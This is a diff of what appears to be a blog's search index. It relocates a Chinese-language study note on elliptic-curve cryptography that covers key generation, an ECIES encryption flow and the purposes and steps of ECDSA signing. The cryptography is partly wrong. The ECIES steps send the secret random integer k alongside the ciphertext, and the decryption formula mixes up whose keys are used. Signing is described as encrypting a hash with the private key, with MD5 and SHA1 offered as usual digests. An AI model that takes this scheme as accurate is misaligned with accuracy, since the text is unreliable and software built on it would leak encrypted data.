-<li><p><strong>生成密文</strong>：使用共享密钥生成对称密钥，用来加密实际的数据（比如AES加密）。然后，计算加密后的数据和随机数的组合：</p>
-<p>C&#x3D;Encrypt(Message,Key)</p>
-</li>
-<li><p><strong>传输密文</strong>：发送方将密文和随机数 k 一起发送给接收方。</p>
-</li>
-</ol>
-<h4 id="解密方："><a href="#解密方：" class="headerlink" title="解密方："></a>解密方：</h4><ol>
-<li><p><strong>计算共享密钥</strong>：接收方使用自己的私钥和发送方的公钥计算共享密钥。</p>
-<p>K&#x3D;k×Alice’s Public Key      —Alice’s Public Key&#x3D;Bob的私钥×G</p>
-</li>
-<li><p><strong>解密密文</strong>：接收方使用计算得到的共享密钥解密收到的密文。</p>
-<p>Message&#x3D;Decrypt(C,Key)</p>
-</li>
-</ol>
-<h2 id="3-数字签名（ECDSA）"><a href="#3-数字签名（ECDSA）" class="headerlink" title="3.数字签名（ECDSA）"></a>3.<strong>数字签名（ECDSA）</strong></h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1.作用:"></a>1.作用:</h3><h4 id="身份验证（Authentication）"><a href="#身份验证（Authentication）" class="headerlink" title="身份验证（Authentication）"></a><strong>身份验证（Authentication）</strong></h4><p>数字签名能够证明消息确实是由消息的发送者发出的，并且没有被篡改。</p>
-<ul>
-<li><strong>公钥基础设施（PKI）</strong>：通过数字签名，接收方能够验证消息是否确实是由声明的发送方发出的。这是因为签名是使用发送方的私钥生成的，而只有拥有对应私钥的人才能生成有效的签名。因此，接收方可以使用发送方的公钥来验证签名是否有效，确保消息的发件人身份。</li>
-</ul>
-<h4 id="数据完整性（Data-Integrity）"><a href="#数据完整性（Data-Integrity）" class="headerlink" title="数据完整性（Data Integrity）"></a><strong>数据完整性（Data Integrity）</strong></h4><p>数字签名确保了消息在传输过程中未被篡改。</p>
-<ul>
-<li><strong>哈希值</strong>：数字签名通常会对消息进行哈希运算（生成消息摘要），然后使用私钥对这个哈希值进行签名。如果消息内容在传输过程中被修改，计算得到的哈希值就会发生变化，验证签名时就会失败，从而能够检测到数据被篡改。</li>
-</ul>
-<h4 id="不可否认性（Non-repudiation）"><a href="#不可否认性（Non-repudiation）" class="headerlink" title="不可否认性（Non-repudiation）"></a><strong>不可否认性（Non-repudiation）</strong></h4><p>数字签名提供了不可否认性，即发送方不能否认自己已签署某个消息。</p>
-<ul>
-<li>由于数字签名是通过发送方的私钥生成的，且只有发送方拥有私钥，因此在签署之后，发送方不能声称自己没有发送过该消息。即使在后续，发送方也不能否认自己发送的消息。</li>
-</ul>
-<h4 id="防篡改"><a href="#防篡改" class="headerlink" title="防篡改"></a><strong>防篡改</strong></h4><p>数字签名还能够保证消息的完整性。任何在消息上的修改都会导致签名验证失败，防止数据在传输过程中被篡改。</p>
-<h2 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程:"></a>2.流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送方:</span><br><span class="line">    1.首先对要发送的二进制数据流进行哈希摘要</span><br><span class="line">                   --- 常用哈希摘要: MD5 ,SHA1  ,SHA256  </span><br><span class="line">    2.使用私钥对摘要进行加密(签名)</span><br><span class="line">接受方:</span><br><span class="line">    1.使用发送方的公钥对摘要进行解密</span><br><span class="line">    2.使用同样的哈希算法对二进制数据流进行计算</span><br><span class="line">    3.对比两次哈希是否一致，一致则未篡改</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-  </entry>
-  <entry>
     <title></title>
     <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/RAS/</url>
     <content><![CDATA[<h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA:"></a>RSA:</h1><p>建立在大整数因式分解难题</p>
@@ -5912,5 +5857,60 @@
     <title></title>
     <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/SM2/</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/09/17/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/</url>
+    <content><![CDATA[<h1 id="椭圆曲线密码-ECC"><a href="#椭圆曲线密码-ECC" class="headerlink" title="椭圆曲线密码(ECC):"></a>椭圆曲线密码(ECC):</h1><p>基于椭圆曲线离散对数问题（ECDLP）难解性</p>
+<h2 id="1-密钥的生成"><a href="#1-密钥的生成" class="headerlink" title="1. 密钥的生成:"></a>1. 密钥的生成:</h2><p>在椭圆曲线加密中，密钥生成包括两部分：<strong>私钥</strong>和<strong>公钥</strong>。</p>
+<ul>
+<li><p><strong>私钥</strong>：随机选择一个大整数，通常通过一个安全的随机数生成器来生成。</p>
+</li>
+<li><p><strong>公钥</strong>：通过私钥和椭圆曲线的基点（生成点）进行运算生成。公钥是私钥与基点的乘积，记作：</p>
+<p>Public Key&#x3D;Private Key×G</p>
+<p>其中 G 是椭圆曲线的基点。</p>
+</li>
+</ul>
+<h2 id="2-加密流程"><a href="#2-加密流程" class="headerlink" title="2.加密流程:"></a>2.加密流程:</h2><p>椭圆曲线集成加密方案（ECIES，Elliptic Curve Integrated Encryption Scheme）是一种使用椭圆曲线加密的标准方法，下面是ECIES的加密流程：</p>
+<h4 id="加密方："><a href="#加密方：" class="headerlink" title="加密方："></a>加密方：</h4><ol>
+<li><p><strong>选择公钥</strong>：接收方（Bob）将其公钥提供给发送方（Alice）。</p>
+</li>
+<li><p><strong>生成随机数</strong>：发送方随机选择一个整数 k，该整数与椭圆曲线基点 G 结合来生成加密密钥。</p>
+</li>
+<li><p><strong>计算共享密钥</strong>：发送方使用自己的私钥和接收方的公钥，计算共享密钥（共享密钥的计算基于椭圆曲线Diffie-Hellman协议）：</p>
+<p>K&#x3D;k×Bob’s Public Key     —Bob’s Public Key&#x3D;Bob的私钥×G</p>
+</li>
+<li><p><strong>生成密文</strong>：使用共享密钥生成对称密钥，用来加密实际的数据（比如AES加密）。然后，计算加密后的数据和随机数的组合：</p>
+<p>C&#x3D;Encrypt(Message,Key)</p>
+</li>
+<li><p><strong>传输密文</strong>：发送方将密文和随机数 k 一起发送给接收方。</p>
+</li>
+</ol>
+<h4 id="解密方："><a href="#解密方：" class="headerlink" title="解密方："></a>解密方：</h4><ol>
+<li><p><strong>计算共享密钥</strong>：接收方使用自己的私钥和发送方的公钥计算共享密钥。</p>
+<p>K&#x3D;k×Alice’s Public Key      —Alice’s Public Key&#x3D;Bob的私钥×G</p>
+</li>
+<li><p><strong>解密密文</strong>：接收方使用计算得到的共享密钥解密收到的密文。</p>
+<p>Message&#x3D;Decrypt(C,Key)</p>
+</li>
+</ol>
+<h2 id="3-数字签名（ECDSA）"><a href="#3-数字签名（ECDSA）" class="headerlink" title="3.数字签名（ECDSA）"></a>3.<strong>数字签名（ECDSA）</strong></h2><h3 id="1-作用"><a href="#1-作用" class="headerlink" title="1.作用:"></a>1.作用:</h3><h4 id="身份验证（Authentication）"><a href="#身份验证（Authentication）" class="headerlink" title="身份验证（Authentication）"></a><strong>身份验证（Authentication）</strong></h4><p>数字签名能够证明消息确实是由消息的发送者发出的，并且没有被篡改。</p>
+<ul>
+<li><strong>公钥基础设施（PKI）</strong>：通过数字签名，接收方能够验证消息是否确实是由声明的发送方发出的。这是因为签名是使用发送方的私钥生成的，而只有拥有对应私钥的人才能生成有效的签名。因此，接收方可以使用发送方的公钥来验证签名是否有效，确保消息的发件人身份。</li>
+</ul>
+<h4 id="数据完整性（Data-Integrity）"><a href="#数据完整性（Data-Integrity）" class="headerlink" title="数据完整性（Data Integrity）"></a><strong>数据完整性（Data Integrity）</strong></h4><p>数字签名确保了消息在传输过程中未被篡改。</p>
+<ul>
+<li><strong>哈希值</strong>：数字签名通常会对消息进行哈希运算（生成消息摘要），然后使用私钥对这个哈希值进行签名。如果消息内容在传输过程中被修改，计算得到的哈希值就会发生变化，验证签名时就会失败，从而能够检测到数据被篡改。</li>
+</ul>
+<h4 id="不可否认性（Non-repudiation）"><a href="#不可否认性（Non-repudiation）" class="headerlink" title="不可否认性（Non-repudiation）"></a><strong>不可否认性（Non-repudiation）</strong></h4><p>数字签名提供了不可否认性，即发送方不能否认自己已签署某个消息。</p>
+<ul>
+<li>由于数字签名是通过发送方的私钥生成的，且只有发送方拥有私钥，因此在签署之后，发送方不能声称自己没有发送过该消息。即使在后续，发送方也不能否认自己发送的消息。</li>
+</ul>
+<h4 id="防篡改"><a href="#防篡改" class="headerlink" title="防篡改"></a><strong>防篡改</strong></h4><p>数字签名还能够保证消息的完整性。任何在消息上的修改都会导致签名验证失败，防止数据在传输过程中被篡改。</p>
+<h2 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程:"></a>2.流程:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送方:</span><br><span class="line">    1.首先对要发送的二进制数据流进行哈希摘要</span><br><span class="line">                   --- 常用哈希摘要: MD5 ,SHA1  ,SHA256  </span><br><span class="line">    2.使用私钥对摘要进行加密(签名)</span><br><span class="line">接受方:</span><br><span class="line">    1.使用发送方的公钥对摘要进行解密</span><br><span class="line">    2.使用同样的哈希算法对二进制数据流进行计算</span><br><span class="line">    3.对比两次哈希是否一致，一致则未篡改</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
   </entry>
 </search>
